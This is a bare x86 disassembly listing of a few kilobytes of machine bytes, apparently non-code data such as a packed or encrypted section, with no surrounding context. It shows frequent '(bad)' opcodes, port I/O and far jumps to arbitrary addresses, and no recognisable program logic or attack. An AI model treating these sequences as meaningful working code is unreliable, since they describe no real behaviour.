  428ce4:	or     ebx,ebx
  428ce6:	es jbe 0x428c94
  428ce9:	pop    esp
  428cea:	in     al,dx
  428ceb:	sar    edx,0xcb
  428cee:	ret    0xb5b6
  428cf1:	sar    BYTE PTR [edx+0x4975dc36],1
  428cf7:	xchg   edi,eax
  428cf8:	push   0x1b8d6a6b
  428cfd:	fcmovnbe st,st(6)
  428cff:	jbe    0x428d4d
  428d01:	cmp    al,0x2c
  428d03:	in     eax,0x69
  428d05:	adc    edi,DWORD PTR [esi]
  428d07:	cld    
  428d08:	add    al,0xb0
  428d0a:	push   eax
  428d0b:	mov    ah,0x8d
  428d0d:	mov    al,0xde
  428d0f:	lds    eax,FWORD PTR ss:[esi]
  428d12:	loopne 0x428cea
  428d14:	das    
  428d15:	inc    ebx
  428d16:	mov    bl,0x35
  428d18:	ret    0xb2f6
  428d1b:	add    al,0x6a
  428d1d:	mov    ebx,0xc95176a2
  428d22:	jne    0x428d57
  428d24:	enter  0xda8c,0x9e
  428d28:	jbe    0x428d3a
  428d2a:	fisttp QWORD PTR [esi-0x55d735]
  428d30:	dec    edx
  428d31:	adc    al,0x4c
  428d33:	cmp    al,0xf0
  428d35:	or     DWORD PTR [esi-0x11604375],0xb4b95a74
  428d3f:	mov    ah,0x6d
  428d41:	pop    ebx
  428d42:	out    0x71,eax
  428d44:	xor    eax,0x32420bc0
  428d49:	rol    DWORD PTR ds:0x2806dada,1
  428d4f:	call   0x2724054f
  428d54:	push   esi
  428d55:	mov    cl,BYTE PTR [esi-0x9f5635e]
  428d5b:	call   0x6c70416e
  428d60:	fstp   TBYTE PTR [edx-0x1d]
  428d63:	mov    bl,0x47
  428d65:	repz add DWORD PTR [eax+0x6db76144],ecx
  428d6c:	mov    eax,ds:0x1dcdd105
  428d71:	(bad)  
  428d72:	xor    edi,DWORD PTR [esp+ecx*1+0x5744ba14]
  428d79:	ins    DWORD PTR es:[edi],dx
  428d7a:	push   0xfde88547
  428d7f:	lahf   
  428d80:	inc    ebp
  428d81:	(bad)  
  428d82:	ss loope 0x428d87
  428d85:	cwde   
  428d86:	dec    ecx
  428d87:	ja     0x428d67
  428d89:	sti    
  428d8a:	stos   BYTE PTR es:[edi],al
  428d8b:	fcomp  QWORD PTR [edx+0x1]
  428d8e:	fist   DWORD PTR [esi+0x4d]
  428d91:	jno    0x428d23
  428d93:	cmp    BYTE PTR [edx-0x36],cl
  428d96:	pop    ebx
  428d97:	or     ebx,DWORD PTR [ebx+0x13]
  428d9a:	adc    DWORD PTR [edx+0x59],ecx
  428d9d:	jl     0x428d27
  428d9f:	inc    eax
  428da0:	ins    DWORD PTR es:[edi],dx
  428da1:	clc    
  428da2:	ins    DWORD PTR es:[edi],dx
  428da3:	push   ebp
  428da4:	scas   al,BYTE PTR es:[edi]
  428da5:	sbb    BYTE PTR [edi+ebx*1],0x53
  428da9:	push   edx
  428daa:	mov    ds:0xe6b6c1d0,eax
  428daf:	xor    eax,0xd8cbc8da
  428db4:	popa   
  428db5:	add    DWORD PTR [ebx-0x2b],0xe8f7616d
  428dbc:	sub    BYTE PTR [edi],0x40
  428dbf:	ror    DWORD PTR [esi+0x5b8a06d6],1
  428dc5:	xor    al,ah
  428dc7:	mov    ch,0x6a
  428dc9:	jns    0x428e1d
  428dcb:	fcmovnu st,st(4)
  428dcd:	sub    ch,BYTE PTR [edi+edx*4-0x26]
  428dd1:	xchg   esi,eax
  428dd2:	das    
  428dd3:	adc    al,0x7b
  428dd5:	mov    eax,0xb63766ef
  428dda:	sub    eax,0xf404dc3d
  428ddf:	dec    ebp
  428de0:	pop    ds
  428de1:	lea    ebx,[eax-0x104664d6]
  428de7:	mov    dh,0xe
  428de9:	call   0x8fb2a7b0
  428dee:	shl    ch,cl
  428df0:	dec    ebp
  428df1:	and    BYTE PTR [ebx],bl
  428df3:	sub    eax,0x77dadf2d
  428df8:	mov    ecx,0x53529a
  428dfd:	into   
  428dfe:	or     BYTE PTR ds:0xb6d2dba7,al
  428e04:	mov    al,0xfe
  428e06:	lock jns 0x428e31
  428e09:	or     eax,DWORD PTR [ebx]
  428e0b:	push   esi
  428e0c:	(bad)  
  428e0d:	retf   
  428e0e:	lahf   
  428e0f:	stos   DWORD PTR es:[edi],eax
  428e10:	push   ebp
  428e11:	sbb    eax,DWORD PTR [ebp+0x415d6da0]
  428e17:	(bad)  
  428e18:	push   edx
  428e19:	test   al,0xdb
  428e1b:	bnd jbe 0x428deb
  428e1e:	inc    edx
  428e1f:	cmp    bl,0x0
  428e22:	sbb    DWORD PTR [ebx+0x14],edi
  428e25:	lds    esi,FWORD PTR [edi-0x80]
  428e28:	fimul  DWORD PTR [ebp-0x2dea7fda]
  428e2e:	xchg   ecx,ebx
  428e30:	push   cs
  428e31:	outs   dx,BYTE PTR ds:[esi]
  428e32:	add    eax,0x52c4dabc
  428e37:	adc    BYTE PTR [ebx-0x1f74dd37],0x46
  428e3e:	(bad)  [edx]
  428e40:	xchg   edx,eax
  428e41:	push   0xad8c3bed
  428e46:	lods   eax,DWORD PTR ds:[esi]
  428e47:	test   DWORD PTR [edx+0x737081b5],esi
  428e4d:	add    eax,0x6910aa5b
  428e52:	stc    
  428e53:	sbb    ebx,ebx
  428e55:	pop    esp
  428e56:	fidiv  DWORD PTR ds:0xce0676
  428e5c:	pop    ebx
  428e5d:	arpl   WORD PTR [eax],ax
  428e5f:	cmp    esp,edx
  428e61:	sub    DWORD PTR [ecx+0x47],0xffffffd1
  428e65:	ins    DWORD PTR es:[edi],dx
  428e66:	or     BYTE PTR [ebx],0x12
  428e69:	test   BYTE PTR [esi-0x33],dh
  428e6c:	sbb    eax,0xc0c97062
  428e71:	inc    esi
  428e72:	test   al,0x38
  428e74:	or     DWORD PTR [edx+0x412f0a70],edx
  428e7a:	ins    DWORD PTR es:[edi],dx
  428e7b:	dec    ebp
  428e7c:	inc    edi
  428e7d:	out    dx,eax
  428e7e:	jp     0x428ee7
  428e80:	mov    edi,0x63f50023
  428e85:	or     ebx,DWORD PTR [eax+ebx*4]
  428e88:	xchg   ecx,eax
  428e89:	mov    esp,0x170067c7
  428e8e:	push   ss
  428e8f:	mov    dh,0x6d
  428e91:	sbb    cl,BYTE PTR [ecx+esi*2+0x3adf0c11]
  428e98:	call   0x42cb:0x172973f
  428e9f:	lds    ebx,FWORD PTR [ebx+0x6b620656]
  428ea5:	pop    ss
  428ea6:	sbb    al,BYTE PTR [ecx+0x62]
  428ea9:	push   ss
  428eaa:	aam    0x6b
  428eac:	push   cs
  428ead:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428eae:	fnstenv [esi-0x5af4a4f5]
  428eb4:	xchg   ebp,eax
  428eb5:	xchg   BYTE PTR [esi],dl
  428eb7:	test   DWORD PTR [ebp-0x4929ce68],edx
  428ebd:	mov    al,0xd0
  428ebf:	cmp    BYTE PTR [edx],bh
  428ec1:	pop    ebp
  428ec2:	or     al,BYTE PTR [ebp-0x1d]
  428ec5:	aam    0x46
  428ec7:	sub    BYTE PTR [edi],bh
  428ec9:	xchg   esi,eax
  428eca:	push   esi
  428ecc:	pop    ds
  428ecd:	add    BYTE PTR [esi+0x48260032],bl
  428ed3:	add    dl,BYTE PTR [ebp+edi*8-0x20]
  428ed7:	mov    cl,BYTE PTR [ebx-0x35]
  428eda:	pop    ss
  428edb:	and    al,0xba
  428edd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428ede:	add    BYTE PTR [edi-0x76d7c82],bl
  428ee4:	mov    eax,0x12bb4135
  428ee9:	scas   al,BYTE PTR es:[edi]
  428eea:	ds in  al,0x4b
  428eed:	mov    dh,0xff
  428eef:	jmp    0x3381:0x83945b85
  428ef6:	mov    eax,0x26d4a9e9
  428efb:	mov    cl,BYTE PTR [ebx-0x1a]
  428efe:	shl    esi,1
  428f00:	and    al,bh
  428f02:	aam    0x63
  428f04:	imul   edx,DWORD PTR [eax+0xd],0x69
  428f08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f09:	adc    DWORD PTR [ecx],0x7b
  428f0c:	jmp    0x60a9:0x76c0535b
  428f13:	jp     0x428f6e
  428f15:	fmul   QWORD PTR [ecx+edx*8]
  428f18:	fstp   DWORD PTR [ebx+0x51]
  428f1b:	mov    ebx,0x83e74a6d
  428f20:	out    0xd,al
  428f22:	frstor [edx]
  428f24:	jae    0x428f86
  428f26:	popa   
  428f27:	pop    ebx
  428f28:	push   0x203dd9b9
  428f2d:	mov    edi,0x585f493a
  428f32:	outs   dx,BYTE PTR ds:[esi]
  428f33:	test   ebp,esi
  428f35:	adc    ecx,ebp
  428f37:	xor    al,BYTE PTR [ebx]
  428f39:	rcr    BYTE PTR [esi+0x0],1
  428f3c:	pop    esi
  428f3d:	sub    DWORD PTR [edx-0x75],ebp
  428f40:	pusha  
  428f41:	sub    esp,DWORD PTR [eax+eiz*2-0x77ebacfb]
  428f48:	test   DWORD PTR [esi-0x6eb0b3c8],ebp
  428f4e:	addr16 inc edx
  428f50:	popa   
  428f51:	fld    TBYTE PTR [esi]
  428f53:	dec    ecx
  428f54:	and    DWORD PTR [edi],0x29
  428f57:	jbe    0x428f61
  428f59:	mov    cl,BYTE PTR [edx]
  428f5b:	sub    ecx,DWORD PTR [ebp-0x4e3d177a]
  428f61:	jmp    0x428fb1
  428f63:	shr    DWORD PTR [edi+0x2156675],0xda
  428f6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f6b:	imul   ecx
  428f6d:	int    0x6d
  428f6f:	add    BYTE PTR [esi],0x54
  428f72:	fidiv  DWORD PTR [esi]
  428f74:	outs   dx,BYTE PTR cs:[esi]
  428f76:	dec    ebp
  428f77:	test   eax,0x504ace72
  428f7c:	inc    edi
  428f7d:	fcmovnb st,st(2)
  428f7f:	push   edx
  428f80:	mov    ebx,0xceb8a671
  428f85:	pop    ecx
  428f86:	and    al,0x34
  428f88:	(bad)  
  428f89:	xlat   BYTE PTR ds:[ebx]
  428f8a:	mov    dl,0xb6
  428f8c:	fstp   QWORD PTR [edx+0x4fb98a2]
  428f92:	inc    esp
  428f93:	jbe    0x428f36
  428f95:	add    eax,0xb5b54a5f
  428f9a:	xchg   ebp,eax
  428f9b:	xor    BYTE PTR [eax+ebp*2],0xd
  428f9f:	test   DWORD PTR [eax-0x47f593d4],eax
  428fa5:	aaa    
  428fa6:	adc    eax,0x9ca78898
  428fab:	shl    DWORD PTR [ecx-0x493be897],cl
  428fb1:	mov    al,ds:0x5a235f2
  428fb6:	jle    0x428fe1
  428fb8:	popa   
  428fb9:	test   eax,0xdbcb52fc
  428fbe:	and    al,BYTE PTR [eax]
  428fc0:	and    dl,bh
  428fc2:	mov    ecx,0xedb16a14
  428fc7:	pop    esp
  428fc8:	jno    0x429020
  428fca:	jno    0x42902f
  428fcc:	sti    
  428fcd:	sahf   
  428fce:	pop    esp
  428fcf:	pop    ecx
  428fd0:	push   ebx
  428fd1:	sbb    ebp,DWORD PTR [ebp-0x25]
  428fd4:	adc    eax,0x234e80c2
  428fd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428fda:	dec    ebp
  428fdb:	pushf  
  428fdc:	push   ss
  428fdd:	lods   eax,DWORD PTR ds:[esi]
  428fde:	mov    DWORD PTR [esi],ebp
  428fe0:	mov    ah,0xe8
  428fe2:	jp     0x429006
  428fe4:	ja     0x11515dcb
  428fea:	pop    ss
  428feb:	ss mov dh,0x40
  428fee:	into   
  428fef:	call   0xc40b:0x6e7cb578
  428ff6:	ins    DWORD PTR es:[edi],dx
  428ff7:	add    ebx,DWORD PTR [eax+eiz*8-0x52]
  428ffb:	scas   eax,DWORD PTR es:[edi]
  428ffc:	fnsave [ecx]
  428ffe:	bound  esi,QWORD PTR [eax+0x6e4d6ed0]
  429004:	jle    0x429083
  429006:	not    DWORD PTR [eax]
  429008:	pop    ss
  429009:	shr    DWORD PTR [esi+esi*1],0xb3
  42900d:	mov    ah,0xb1
  42900f:	and    al,0x90
  429012:	mov    al,ds:0xa1b33ee0
  429017:	cdq    
  429018:	loop   0x429031
  42901a:	xchg   esi,eax
  42901b:	mov    eax,ds:0x44354c2b
  429020:	add    BYTE PTR [edi],dh
  429022:	clc    
  429023:	sbb    DWORD PTR [ecx+0x2c02d6e2],ebp
  429029:	(bad)  
  42902a:	lods   al,BYTE PTR ds:[esi]
  42902b:	loop   0x428fb9
  42902d:	add    al,0xb
  42902f:	test   DWORD PTR ds:0xdf8a6ea2,ecx
  429035:	sub    BYTE PTR [ecx],bl
  429037:	dec    BYTE PTR [ebx]
  429039:	aam    0xb6
  42903b:	mov    ch,0x3a
  42903d:	xchg   BYTE PTR [esi+ecx*1],ch
  429040:	rol    DWORD PTR [ebp-0x5e],1
  429043:	imul   esp,DWORD PTR [ebp+0x356da16d],0xca6a8c8a
  42904d:	xor    eax,0xdb6cb08b
  429052:	lea    eax,[ebp+0x21b3d68a]
  429058:	fmul   st,st(5)
  42905a:	xchg   edx,eax
  42905b:	out    dx,al
  42905c:	sbb    cl,BYTE PTR [eax]
  42905e:	jbe    0x4290b4
  429060:	pop    ebp
  429061:	push   0xc67279ab
  429066:	mul    bl
  429068:	js     0x4290bb
  42906a:	jmp    0x429026
  42906c:	or     BYTE PTR [ebx+0x10],dl
  42906f:	fcmovbe st,st(2)
  429071:	bnd ret 
  429073:	inc    eax
  429074:	fisttp QWORD PTR [edx+0x5f]
  429077:	and    edi,DWORD PTR [ecx+edx*2-0x494973bb]
  42907e:	fiadd  DWORD PTR [esi+0x63]
  429081:	or     DWORD PTR [ebx-0x3780cbe1],esi
  429087:	push   esp
  429088:	fstp   st(0)
  42908a:	ficomp DWORD PTR [esi+0x48bac1f9]
  429090:	cdq    
  429091:	cmp    ecx,edx
  429093:	das    
  429094:	mov    al,0x35
  429096:	call   0xe743:0xf6f705ee
  42909d:	add    BYTE PTR [edi],dh
  42909f:	cdq    
  4290a0:	mov    dh,0xb5
  4290a2:	or     dl,BYTE PTR [esi+0x659d9cef]
  4290a8:	daa    
  4290a9:	imul   ebp,DWORD PTR ds:0xb0db6d14,0x59
  4290b0:	jmp    0xa2eb:0x3afb09d7
  4290b7:	outs   dx,BYTE PTR ds:[esi]
  4290b8:	jl     0x42911b
  4290ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4290bb:	mov    bh,0x54
  4290bd:	faddp  st(5),st
  4290c0:	cwde   
  4290c1:	outs   dx,BYTE PTR ds:[esi]
  4290c2:	pop    ebx
  4290c3:	add    esp,DWORD PTR [eax+0x40]
  4290c6:	aad    0x47
  4290c8:	sub    dh,BYTE PTR ds:0xdb741b51
  4290ce:	mov    dh,0xaf
  4290d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290d1:	pop    ecx
  4290d2:	add    eax,0x20bd2687
  4290d7:	test   BYTE PTR [ebx+0x170ab71a],bh
  4290dd:	push   ebx
  4290de:	inc    ebp
  4290df:	xor    bl,BYTE PTR [edi-0x248bef1f]
  4290e5:	push   ss
  4290e6:	imul   DWORD PTR [ebp+0x75]
  4290e9:	out    0xd4,al
  4290eb:	sti    
  4290ec:	repz push edi
  4290ee:	ins    DWORD PTR es:[edi],dx
  4290ef:	mov    ebx,0xe016eed4
  4290f4:	mov    ds:0xcb61778b,al
  4290f9:	loopne 0x429091
  4290fb:	mov    dh,0xc6
  4290fd:	and    eax,0x185d3980
  429102:	sbb    dh,BYTE PTR [esi-0x7d]
  429105:	sbb    dh,BYTE PTR [esi+0x61]
  429108:	popa   
  429109:	fist   DWORD PTR [edx+0x61d46b0f]
  42910f:	mov    edi,0x41bc0b7f
  429114:	pop    edx
  429115:	pop    edx
  429116:	fdiv   DWORD PTR [esi+0x66b5f95]
  42911c:	fsubr  QWORD PTR [ebp+0x1b85aad7]
  429122:	pop    ebx
  429123:	add    eax,DWORD PTR [ebx+0x17]
  429126:	dec    edi
  429127:	lahf   
  429128:	sbb    DWORD PTR [ecx-0x2a4bb2c9],ecx
  42912e:	dec    edx
  42912f:	jge    0x42914f
  429131:	les    eax,FWORD PTR [ecx+0x401d5eea]
  429137:	fwait
  429138:	cmp    BYTE PTR [eax],0xa5
  42913b:	imul   esi,DWORD PTR [edi]
  42913e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42913f:	sbb    ebx,DWORD PTR [ebx]
  429141:	lea    ecx,[ebx]
  429143:	icebp  
  429144:	push   ebp
  429145:	jl     0x4291bc
  429147:	daa    
  429148:	ja     0x42911c
  42914a:	lahf   
  42914b:	pop    eax
  42914c:	mov    al,ds:0x2f1788ed
  429151:	sbb    DWORD PTR [edx],0x59
  429154:	adc    dl,al
  429156:	fstp   TBYTE PTR [edx-0x7d757a7e]
  42915c:	cmp    ecx,DWORD PTR [ecx]
  42915e:	inc    edi
  42915f:	push   ss
  429160:	mov    edi,0x6ddb1a16
  429165:	lods   eax,DWORD PTR ds:[esi]
  429166:	jge    0x429109
  429168:	ret    
  429169:	push   esi
  42916a:	and    DWORD PTR [edi+0x4],ebp
  42916d:	inc    edx
  42916e:	imul   esp,DWORD PTR [ebx-0x4468e923],0xffffff89
  429175:	nop
  429176:	out    0x6b,al
  429178:	dec    eax
  429179:	xchg   ebx,eax
  42917a:	fsubr  QWORD PTR [esi+0x1b]
  42917d:	or     eax,0x7478075
  429182:	xor    ebx,DWORD PTR [edx+0x21]
  429185:	mov    dh,0x86
  429187:	mov    al,0x56
  429189:	inc    ecx
  42918a:	mov    ebx,0xdbf2b2b5
  42918f:	js     0x4291f0
  429191:	int    0x20
  429193:	or     dh,BYTE PTR ss:[edi+0x55b40b23]
  42919a:	mov    cl,0x53
  42919c:	push   ebp
  42919d:	fist   DWORD PTR [esi+0x5b]
  4291a0:	xchg   esp,eax
  4291a1:	mov    ebp,0x44e90186
  4291a6:	loope  0x4291df
  4291a8:	test   al,0xbc
  4291aa:	mov    ah,0xf7
  4291ac:	in     al,dx
  4291ad:	shr    DWORD PTR [esi+0x0],1
  4291b0:	push   ebx
  4291b1:	es int3 
  4291b3:	mov    ds:0x68d8db6d,al
  4291b8:	adc    al,0x4e
  4291ba:	pop    edx
  4291bb:	xor    BYTE PTR [esi],bl
  4291bd:	push   ebx
  4291be:	mov    ebp,0x36dc7c23
  4291c3:	fcmove st,st(1)
  4291c5:	inc    eax
  4291c6:	jge    0x4291ce
  4291c8:	pushf  
  4291c9:	adc    al,0xe5
  4291cb:	into   
  4291cc:	sub    dl,BYTE PTR [esi+0x2d44b544]
  4291d2:	or     eax,0x6d70e57c
  4291d7:	or     ebp,DWORD PTR ds:0x971cb4d1
  4291dd:	lods   ax,WORD PTR ds:[esi]
  4291df:	sbb    BYTE PTR [edx+edi*1-0x493912bf],bh
  4291e6:	(bad)  
  4291e7:	retf   
  4291e8:	outs   dx,BYTE PTR ds:[esi]
  4291e9:	retf   
  4291ea:	stos   DWORD PTR es:[edi],eax
  4291eb:	cwde   
  4291ec:	sbb    edi,edx
  4291ee:	mov    eax,ds:0xf62db06c
  4291f3:	pop    esi
  4291f4:	sbb    DWORD PTR [ebp+0x151912e6],0xffffff8a
  4291fb:	fidiv  DWORD PTR [esi+0x4d]
  4291fe:	push   eax
  4291ff:	out    dx,eax
  429200:	dec    ebp
  429201:	add    dl,BYTE PTR [esi+0x7b]
  429204:	loop   0x4291c8
  429206:	mov    dh,0x9b
  429208:	sub    al,0x32
  42920a:	out    dx,eax
  42920b:	push   ss
  42920c:	jmp    0x54d0:0x20212885
  429213:	jno    0x429278
  429215:	pop    ebp
  429216:	inc    edi
  429218:	pusha  
  429219:	mov    edi,DWORD PTR cs:[edx-0x2491293]
  429220:	stos   DWORD PTR es:[edi],eax
  429221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429222:	icebp  
  429223:	repnz mov DWORD PTR [edi],ebp
  429226:	pop    edi
  429227:	mov    bl,0x41
  429229:	daa    
  42922a:	je     0x429287
  42922c:	call   0x4ec19b1
  429231:	imul   DWORD PTR [eax+0x12]
  429234:	call   ecx
  429236:	outs   dx,BYTE PTR ds:[esi]
  429237:	sbb    ecx,DWORD PTR ds:0x14db0117
  42923d:	cmp    ecx,DWORD PTR [ecx]
  42923f:	dec    ebx
  429240:	mov    esp,0xbb6d6e14
  429245:	jb     0x429235
  429247:	push   0x80624314
  42924c:	and    DWORD PTR [esi],esi
  42924e:	mov    ds:0x6ed546b7,eax
  429253:	mov    cl,BYTE PTR [esi-0xda1c4e1]
  429259:	ret    0xddd5
  42925c:	mov    dh,0x6d
  42925e:	stc    
  42925f:	add    ch,cl
  429261:	call   0x41aa:0x5cdd2e00
  429268:	dec    edi
  429269:	stos   BYTE PTR es:[edi],al
  42926a:	push   ds
  42926b:	jmp    0x429223
  42926d:	in     eax,dx
  42926e:	xchg   edx,eax
  42926f:	mov    ds:0xc6a76fb3,eax
  429274:	int    0xc8
  429276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429277:	add    dl,BYTE PTR [ecx-0x49]
  42927a:	mov    dh,0xc2
  42927c:	daa    
  42927d:	xor    DWORD PTR [esi],esp
  42927f:	(bad)  [edx+0x6b]
  429282:	lahf   
  429283:	cs mov ah,0x76
  429286:	arpl   WORD PTR [ebx],ax
  429288:	fsubr  DWORD PTR [eax+0x4d]
  42928b:	push   ecx
  42928c:	push   esp
  42928d:	rcl    DWORD PTR [esi+0x2c5103e4],1
  429293:	inc    ebp
  429294:	pop    ds
  429295:	mov    dh,0xd5
  429297:	jbe    0x42921c
  429299:	mov    gs,WORD PTR [eax+0x3a]
  42929c:	jl     0x429307
  42929e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42929f:	mov    eax,ds:0x6e892157
  4292a4:	or     ebx,DWORD PTR ds:0x2e1db0c0
  4292aa:	and    al,BYTE PTR [edx+0x2d063e4d]
  4292b0:	fstp   QWORD PTR [edx]
  4292b2:	add    al,BYTE PTR [esi]
  4292b4:	mov    dh,0x95
  4292b6:	xchg   edi,eax
  4292b7:	inc    edx
  4292b8:	adc    al,0x1a
  4292ba:	mov    DWORD PTR [ebx-0x57],ebx
  4292bd:	mov    al,ds:0x613ebf2c
  4292c2:	stc    
  4292c3:	jae    0x429266
  4292c5:	ins    DWORD PTR es:[edi],dx
  4292c6:	inc    ecx
  4292c7:	pop    ebx
  4292c8:	ja     0x42933a
  4292ca:	mov    DWORD PTR [eax],esp
  4292cc:	adc    DWORD PTR [edx],edi
  4292ce:	jno    0x4292ab
  4292d0:	mov    dh,0x76
  4292d2:	fstp   DWORD PTR [eax]
  4292d4:	pop    ecx
  4292d5:	sub    BYTE PTR [ebp+ecx*2+0x4a301d84],0xb5
  4292dd:	inc    ecx
  4292de:	and    DWORD PTR [edx-0x257386e2],0xba286b56
  4292e8:	scas   eax,DWORD PTR es:[edi]
  4292e9:	dec    ebp
  4292ea:	(bad)  [ebx-0x4e3776fc]
  4292f0:	sub    eax,0x9ea6856d
  4292f5:	inc    esp
  4292f6:	cmp    DWORD PTR [edi+edi*4-0x291c9c53],0xffffffb8
  4292fe:	pop    ebp
  4292ff:	xor    eax,0x39956fcc
  429304:	mov    ecx,0x1af9ca57
  429309:	fild   DWORD PTR [edx+0x51]
  42930c:	mov    eax,ds:0x332ad174
  429311:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429312:	lods   eax,DWORD PTR ds:[esi]
  429313:	sub    eax,0x54948f97
  429318:	lahf   
  429319:	imul   ecx,DWORD PTR [edi+0x5bb5b924],0x3
  429320:	rcr    BYTE PTR ds:0x830f880f,0xf6
  429327:	xor    BYTE PTR [edi-0x53],dh
  42932a:	sub    edx,ebx
  42932c:	mov    edx,0x172ca8c
  429331:	or     esp,ebx
  429333:	fs sbb ebp,0xffffffda
  429337:	mov    dh,0xad
  429339:	dec    edx
  42933a:	dec    esp
  42933b:	cmp    al,0x6b
  42933d:	push   edi
  42933e:	push   esi
  42933f:	fs fsub st(2),st
  429342:	les    ebp,FWORD PTR [esi]
  429344:	xchg   esp,eax
  429345:	push   ss
  429346:	mov    ds:0xf263e186,al
  42934b:	and    eax,0xd436b131
  429350:	push   ss
  429351:	aad    0xfb
  429353:	pusha  
  429354:	pop    edi
  429355:	mov    dl,0x7a
  429357:	lods   al,BYTE PTR ds:[esi]
  429358:	inc    ebp
  429359:	ins    BYTE PTR es:[edi],dx
  42935a:	sub    dl,bl
  42935c:	ret    0x5019
  42935f:	pop    esp
  429360:	add    al,0xa2
  429362:	pop    ebx
  429363:	popa   
  429364:	fld    TBYTE PTR [edx-0x28]
  429367:	lds    esi,FWORD PTR [eax-0x5a0da6f]
  42936d:	cli    
  42936e:	jne    0x429371
  429370:	aaa    
  429371:	mov    edx,0x13a56ee8
  429376:	add    edi,DWORD PTR [esp+ebx*4]
  429379:	mov    dh,0x9e
  42937b:	fisubr DWORD PTR [esi]
  42937d:	in     al,dx
  42937e:	je     0x42938d
  429380:	and    edx,ebp
  429382:	ret    
  429383:	nop
  429384:	adc    ebx,DWORD PTR [edi+0x36974b1b]
  42938a:	test   BYTE PTR [ebx-0x5bb761cb],0xc9
  429391:	push   esp
  429392:	sbb    al,0x6d
  429394:	mov    BYTE PTR ds:0x29918345,cl
  42939a:	scas   al,BYTE PTR es:[edi]
  42939b:	in     eax,dx
  42939c:	adc    al,0xca
  42939e:	lea    esi,[esi-0x5d]
  4293a1:	jge    0x4293c1
  4293a3:	pusha  
  4293a4:	popa   
  4293a5:	sbb    eax,0xb6e45815
  4293aa:	sbb    ebx,DWORD PTR [ebx-0x5f]
  4293ad:	mov    dh,cl
  4293af:	adc    ch,BYTE PTR [edi-0x6e]
  4293b2:	lods   eax,DWORD PTR ds:[esi]
  4293b4:	pop    edi
  4293b5:	ret    0xeb6d
  4293b8:	mov    BYTE PTR [ecx-0x63],ch
  4293bb:	bound  edi,QWORD PTR gs:[eax]
  4293be:	ds ins BYTE PTR es:[edi],dx
  4293c0:	cmp    ch,BYTE PTR [esi]
  4293c2:	fiadd  DWORD PTR [ebp-0x44abbc7b]
  4293c8:	bnd ret 
  4293ca:	bound  ebx,QWORD PTR [edx-0x7b]
  4293cd:	lods   eax,DWORD PTR ds:[esi]
  4293ce:	and    esi,DWORD PTR [esi+0x352fa1b2]
  4293d4:	add    BYTE PTR [edi+0x2a],0x61
  4293d8:	aaa    
  4293d9:	ss fidivr DWORD PTR ss:0x53120589
  4293e1:	ret    
  4293e2:	lock cmp DWORD PTR [edx+ebx*4+0x6b7cb010],esp
  4293ea:	shl    DWORD PTR [edx],1
  4293ec:	or     cl,BYTE PTR [edx+0x0]
  4293ef:	not    BYTE PTR [ecx+0x2b6dd00d]
  4293f5:	and    eax,0x651a02bf
  4293fa:	jle    0x4293d0
  4293fc:	push   cs
  4293fd:	pop    ebx
  4293fe:	fcomp  DWORD PTR [edx+0x755437aa]
  429404:	and    edx,edi
  429406:	addr16 mov al,ds:0xdbbf
  42940a:	add    BYTE PTR [eax+eiz*2+0x68],bl
  42940e:	nop
  42940f:	or     BYTE PTR [esi+0x23ae1d72],ah
  429415:	mov    BYTE PTR [esi-0x2977949e],al
  42941b:	lods   al,BYTE PTR ds:[esi]
  42941c:	sub    eax,0xb616517b
  429421:	add    eax,0xa1e38c7e
  429426:	push   0x42
  429428:	inc    esp
  429429:	cmp    ebp,DWORD PTR [eax-0x45]
  42942c:	faddp  st(4),st
  42942e:	jge    0x42949e
  429430:	mov    al,BYTE PTR [ebx-0x49]
  429433:	hlt    
  429434:	jle    0x4293df
  429436:	test   eax,0x55f56c76
  42943b:	cwde   
  42943c:	(bad)  
  42943d:	push   ebx
  42943e:	daa    
  42943f:	xchg   esi,eax
  429440:	add    BYTE PTR [eax+0x62],bh
  429443:	mov    al,ds:0x9b54b1b8
  429448:	mov    eax,ds:0xd6afb030
  42944d:	mov    ds:0xea286ad8,al
  429452:	loop   0x4293dc
  429454:	aaa    
  429455:	repnz mov dh,0xad
  429458:	adc    dl,cl
  42945a:	sbb    esp,edx
  42945c:	sub    esi,edi
  42945e:	lds    edi,FWORD PTR [ebx+ebx*1-0x7e]
  429462:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429463:	ficom  DWORD PTR [ecx]
  429465:	jle    0x42945c
  429467:	mov    DWORD PTR [eax],edi
  429469:	dec    esi
  42946a:	adc    esp,0xffffffb6
  42946d:	pop    ebp
  42946e:	inc    ebp
  42946f:	dec    edx
  429470:	jl     0x429487
  429472:	push   ebx
  429473:	fld    QWORD PTR ds:0xb4ba286d
  429479:	outs   dx,BYTE PTR ds:[esi]
  42947a:	push   es
  42947b:	dec    edx
  42947c:	adc    edi,esi
  42947e:	mov    al,0x7b
  429480:	out    0xb1,al
  429482:	fstp   st(2)
  429484:	mov    dh,0x89
  429486:	and    DWORD PTR [ebx-0x3749d649],ebx
  42948c:	test   al,0xb
  42948e:	(bad)  
  42948f:	lods   eax,DWORD PTR ds:[esi]
  429490:	push   cs
  429491:	push   0xf651f213
  429496:	in     eax,0xc1
  429498:	lods   al,BYTE PTR ds:[esi]
  429499:	mov    dh,0xd
  42949b:	add    BYTE PTR [edi+0x2a702669],dh
  4294a1:	mov    bl,ch
  4294a3:	add    esi,DWORD PTR [ebx-0x39245523]
  4294a9:	push   esi
  4294aa:	mov    esp,0x7196aea8
  4294af:	mov    ah,0xe7
  4294b1:	mov    bh,0x85
  4294b3:	mov    dh,0x81
  4294b5:	cmp    bl,BYTE PTR [esp+esi*2]
  4294b8:	xor    eax,0xbbc23240
  4294bd:	push   0x685dadca
  4294c2:	fwait
  4294c3:	inc    eax
  4294c4:	scas   al,BYTE PTR es:[edi]
  4294c5:	ins    DWORD PTR es:[edi],dx
  4294c6:	dec    ebp
  4294c7:	pop    esp
